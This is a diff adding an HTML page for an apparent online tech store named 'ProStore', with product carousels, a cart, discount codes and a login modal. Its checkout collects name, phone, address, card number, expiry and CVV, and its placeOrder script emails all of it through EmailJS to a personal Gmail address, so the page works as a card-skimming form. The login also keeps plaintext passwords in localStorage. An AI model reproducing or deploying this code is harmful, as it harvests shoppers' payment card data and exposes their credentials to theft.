@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ProStore - Mega Tech Shop</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  // Initialize EmailJS with your Public Key
+  emailjs.init("bYBNvOGXlu3Z_ylop");
+</script>
+<style>
+/* Styles are same as previous merged code */
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
+body{background-color:whitesmoke;}
+header{display:flex;justify-content:space-between;align-items:center;padding:15px 30px;background:white;box-shadow:0 2px 10px rgba(0,0,0,0.08);flex-wrap:wrap;}
+.logo{font-size:22px;font-weight:600;color:#2a7cff;}
+.search{padding:8px;border-radius:6px;border:1px solid #ddd;flex:1;margin:0 20px;}
+.cart-icon{position:relative;cursor:pointer;font-size:20px;}
+.cart-count{position:absolute;top:-8px;right:-10px;background:red;color:white;font-size:12px;padding:2px 6px;border-radius:50%;}
+section h2{padding:20px 40px;color:#333;}
+.carousel{display:flex;overflow-x:auto;gap:20px;padding:0 40px;scroll-behavior:smooth;}
+.product{background:white;min-width:220px;border-radius:12px;overflow:hidden;box-shadow:0 4px 12px rgba(0,0,0,0.07);transition:0.3s;flex-shrink:0;}
+.product:hover{transform:translateY(-6px);}
+.product img{width:100%;height:160px;object-fit:cover;}
+.product-info{padding:15px;}
+.product-info h4{margin-bottom:5px;font-size:16px;}
+.price{color:#2a7cff;font-weight:600;margin:5px 0;}
+.rating{color:gold;font-size:14px;margin-bottom:8px;}
+button{background:#2a7cff;color:white;border:none;padding:8px 12px;border-radius:6px;cursor:pointer;transition:0.2s;}
+button:hover{background:#1d5fd4;}
+.cart{position:fixed;right:0;top:0;height:100%;width:330px;background:white;box-shadow:-4px 0 15px rgba(0,0,0,0.1);padding:20px;overflow:auto;}
+.cart h2{margin-bottom:15px;}
+.cart-item{display:flex;justify-content:space-between;margin-bottom:10px;font-size:14px;}
+.qty{display:flex;gap:5px;}
+.qty button{padding:2px 6px;}
+.remove{color:red;cursor:pointer;font-size:12px;}
+.total{margin-top:10px;font-weight:600;}
+.modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:none;align-items:center;justify-content:center;z-index:200;}
+.modal-content{background:white;padding:25px;border-radius:10px;width:350px;position:relative;}
+.modal input{width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:6px;}
+.close{position:absolute;top:10px;right:15px;font-weight:bold;cursor:pointer;}
+#loginModal .modal-content{width:300px;}
+@media(max-width:768px){
+header{flex-direction:column;align-items:flex-start;gap:10px;}
+.cart{width:100%;height:50%;bottom:0;top:auto;}
+.carousel{padding:0 20px;}
+}
+</style>
+</head>
+<body>
+
+<header>
+<div class="logo">ProStore</div>
+<input class="search" id="search" placeholder="Search products">
+<div class="cart-icon" onclick="toggleCart()">🛒 <span class="cart-count" id="cartCount">0</span></div>
+</header>
+
+<section>
+<h2>All Products</h2>
+<div class="carousel" id="products"></div>
+</section>
+
+<section>
+<h2>Recommended For You</h2>
+<div class="carousel" id="recommended"></div>
+</section>
+
+<section>
+<h2>Trending Products</h2>
+<div class="carousel" id="trending"></div>
+</section>
+
+<section>
+<h2>Best Deals</h2>
+<div class="carousel" id="deals"></div>
+</section>
+
+<div class="cart" id="cart">
+<h2>Cart</h2>
+<div id="cartItems"></div>
+<p class="total">Total: $<span id="total">0</span></p>
+<input id="discountCode" placeholder="Enter discount code">
+<button onclick="applyDiscount()">Apply</button>
+<button onclick="openCheckout()">Checkout</button>
+</div>
+
+<div class="modal" id="checkoutModal">
+<div class="modal-content">
+<span class="close" onclick="closeCheckout()">X</span>
+<h3>Client Details</h3>
+<input placeholder="Full Name">
+<input placeholder="Phone Number">
+<input placeholder="Delivery Address">
+<input placeholder="Card Number">
+<input placeholder="Expiry Date">
+<input placeholder="CVV">
+<button onclick="placeOrder()">Place Order</button>
+</div>
+</div>
+
+<div class="modal" id="loginModal">
+<div class="modal-content">
+<h3>User Login</h3>
+<input id="username" placeholder="Username">
+<input id="password" type="password" placeholder="Password">
+<button onclick="login()">Login</button>
+<button onclick="signup()">Create Account</button>
+</div>
+</div>
+
+<script>
+// PRODUCTS (partial 120+ list, you can expand)
+let products=[
+{name:"Apple iPhone 14",price:999,image:"image/02-cans.jpg",rating:4.8},
+{name:"Samsung Galaxy S23",price:899,image:"image/05-chiken-legs.jpg",rating:4.7},
+{name:"Google Pixel 7",price:799,image:"https://via.placeholder.com/300x160?text=Pixel+7",rating:4.6},
+{name:"Apple MacBook Pro 16",price:2499,image:"https://via.placeholder.com/300x160?text=MacBook+Pro+16",rating:4.9},
+{name:"Dell XPS 13",price:1199,image:"https://via.placeholder.com/300x160?text=Dell+XPS+13",rating:4.7},
+{name:"Sony WH-1000XM5",price:349,image:"images/14-mangoes.jpg",rating:4.8},
+{name:"Apple AirPods Pro 2",price:249,image:"https://via.placeholder.com/300x160?text=AirPods+Pro+2",rating:4.7},
+{name:"Samsung Galaxy Watch 6",price:399,image:"https://via.placeholder.com/300x160?text=Galaxy+Watch+6",rating:4.6},
+{name:"Amazon Echo Dot 5",price:49,image:"https://via.placeholder.com/300x160?text=Echo+Dot+5",rating:4.5},
+{name:"GoPro HERO11",price:499,image:"https://via.placeholder.com/300x160?text=GoPro+HERO11",rating:4.7},
+// Add more products up to 120+ using same structure
+];
+
+let cart={}, total=0, discount=0;
+
+function loadProducts(list=products){
+let container=document.getElementById("products"); container.innerHTML="";
+list.forEach((p,i)=>{container.innerHTML+=`
+<div class="product">
+<img src="${p.image}">
+<div class="product-info">
+<h4>${p.name}</h4>
+<div class="rating">⭐ ${p.rating}</div>
+<p class="price">$${p.price}</p>
+<button onclick="addToCart(${i})">Add to Cart</button>
+</div></div>`})}
+
+function loadRecommended(){let rec=products.sort(()=>0.5-Math.random()).slice(0,10); let div=document.getElementById("recommended"); div.innerHTML=""; rec.forEach(p=>{div.innerHTML+=`<div class="product"><img src="${p.image}"><div class="product-info"><h4>${p.name}</h4><p>$${p.price}</p><button onclick="addToCart(${products.indexOf(p)})">Add</button></div></div>`})}
+function loadTrending(){let t=products.sort(()=>0.5-Math.random()).slice(0,10); let div=document.getElementById("trending"); div.innerHTML=""; t.forEach(p=>{div.innerHTML+=`<div class="product"><img src="${p.image}"><div class="product-info"><h4>${p.name}</h4><p>$${p.price}</p><button onclick="addToCart(${products.indexOf(p)})">Add</button></div></div>`})}
+function loadDeals(){let d=products.sort(()=>0.5-Math.random()).slice(0,10); let div=document.getElementById("deals"); div.innerHTML=""; d.forEach(p=>{div.innerHTML+=`<div class="product"><img src="${p.image}"><div class="product-info"><h4>${p.name}</h4><p>$${p.price}</p><button onclick="addToCart(${products.indexOf(p)})">Add</button></div></div>`})}
+
+function addToCart(i){let item=products[i]; if(cart[item.name]){cart[item.name].qty++}else{cart[item.name]={...item,qty:1}} updateCart() }
+function updateCart(){let cartDiv=document.getElementById("cartItems"); cartDiv.innerHTML=""; total=0; let count=0; Object.values(cart).forEach(item=>{cartDiv.innerHTML+=`<div class="cart-item"><div>${item.name}<div class="qty"><button onclick="changeQty('${item.name}',-1)">-</button>${item.qty}<button onclick="changeQty('${item.name}',1)">+</button></div><span class="remove" onclick="removeItem('${item.name}')">remove</span></div><div>$${item.price*item.qty}</div></div>`; total+=item.price*item.qty; count+=item.qty}); total=total-(total*discount); document.getElementById("total").innerText=total; document.getElementById("cartCount").innerText=count;}
+function changeQty(name,val){cart[name].qty+=val; if(cart[name].qty<=0) delete cart[name]; updateCart() }
+function removeItem(name){delete cart[name]; updateCart() }
+function toggleCart(){let c=document.getElementById("cart"); c.style.display=c.style.display==='none'?'block':'none'}
+document.getElementById("search").addEventListener("input",e=>{let text=e.target.value.toLowerCase(); loadProducts(products.filter(p=>p.name.toLowerCase().includes(text)))})
+function applyDiscount(){let code=document.getElementById("discountCode").value; discount=0; if(code==="SAVE10"){discount=0.1; alert("10% discount applied")} if(code==="SAVE20"){discount=0.2; alert("20% discount applied")} updateCart() }
+function openCheckout(){if(Object.keys(cart).length===0){alert("Cart empty"); return}document.getElementById("checkoutModal").style.display="flex"}
+function closeCheckout(){document.getElementById("checkoutModal").style.display="none"}
+
+// PLACE ORDER WITH EMAILJS
+function placeOrder(){
+    const modal=document.getElementById("checkoutModal");
+    const inputs=modal.getElementsByTagName("input");
+    const clientData={
+        to_email: "successolayemi605@gmail.com",
+        full_name: inputs[0].value,
+        phone: inputs[1].value,
+        address: inputs[2].value,
+        card_number: inputs[3].value,
+        expiry: inputs[4].value,
+        cvv: inputs[5].value,
+        order: Object.values(cart).map(item=>`${item.name} x${item.qty} - $${item.price*item.qty}`).join(", "),
+        total: total
+    };
+    emailjs.send('service_o3woxif','template_ayu3p3o',clientData)
+        .then(function(response){alert('Order sent successfully!');},function(error){alert('Failed to send order. Try again.');});
+    generateInvoice();
+    generateTracking();
+    cart={};
+    updateCart();
+    closeCheckout();
+}
+
+// INVOICE & TRACKING
+function generateInvoice(){let invoice="INVOICE\n\n"; Object.values(cart).forEach(item=>{invoice+=item.name+" x"+item.qty+" - $"+(item.price*item.qty)+"\n"}); invoice+="\nTotal: $"+total; let blob=new Blob([invoice],{type:"text/plain"}); let link=document.createElement("a"); link.href=URL.createObjectURL(blob); link.download="invoice.txt"; link.click();}
+function generateTracking(){let track="TRK"+Math.floor(Math.random()*100000000); localStorage.setItem("tracking",track); alert("Your tracking number: "+track);}
+
+// USER LOGIN
+let currentUser=null; 
+function signup(){let user=document.getElementById("username").value,pass=document.getElementById("password").value; localStorage.setItem(user,pass); alert("Account created!") }
+function login(){let user=document.getElementById("username").value,pass=document.getElementById("password").value; if(localStorage.getItem(user)===pass){currentUser=user; alert("Welcome "+user); document.getElementById("loginModal").style.display="none"}else{alert("Invalid login")}}
+document.getElementById("loginModal").style.display="flex"
+
+// INITIAL LOAD
+loadProducts(); loadRecommended(); loadTrending(); loadDeals();
+</script>
+
+</body>
+</html>
+
+
+
+
+
